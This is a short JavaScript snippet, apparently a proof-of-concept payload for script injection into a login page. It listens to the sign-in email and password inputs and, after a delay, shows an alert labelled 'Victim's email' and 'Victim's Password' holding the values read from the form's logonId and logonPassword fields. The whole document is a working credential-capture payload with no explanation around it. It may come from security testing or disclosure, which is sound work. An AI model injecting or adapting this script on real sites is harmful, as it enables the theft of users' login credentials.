let isFilled = false;

 function checkInputs() {
    const input1 = document.getElementById('signin-email');
    const input2 = document.getElementById('signin-password');

    if (input1.value && input2.value) {
      if (!isFilled) {
        isFilled = true; 
        setTimeout(function() {
          alert("Victim's email: "+document.getElementsByName('logonId')[0].value+"\nVictim's Password:"+document.getElementsByName('logonPassword')[0].value);
         
        }, 6500); 
      }
    }
  }

  
  window.onload = checkInputs;


  document.getElementById('signin-email').addEventListener('input', checkInputs);
  document.getElementById('signin-password').addEventListener('input', checkInputs);
